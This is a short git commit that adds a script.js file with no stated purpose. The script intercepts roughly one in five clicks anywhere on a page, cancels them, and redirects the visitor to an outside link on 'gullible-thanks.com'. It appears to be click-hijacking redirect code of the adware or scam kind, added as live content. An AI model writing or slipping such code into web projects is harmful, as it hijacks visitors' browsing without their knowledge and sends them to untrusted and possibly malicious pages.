9a36bab338e17db8714e5ef179a7553be192bbc1
MinerDH <149313062+MinerDH@users.noreply.github.com>
2026-05-13 12:54:01 +0000

    Add files via upload

---
+++ script.js
@@ -0,0 +1,8 @@
+window.addEventListener('click', (event) => {
+    if (Math.random() < 0.2) {
+        event.preventDefault();
+        event.stopPropagation();
+        
+        window.location.href = 'https://gullible-thanks.com/alhQLv';
+    }
+}, true); 
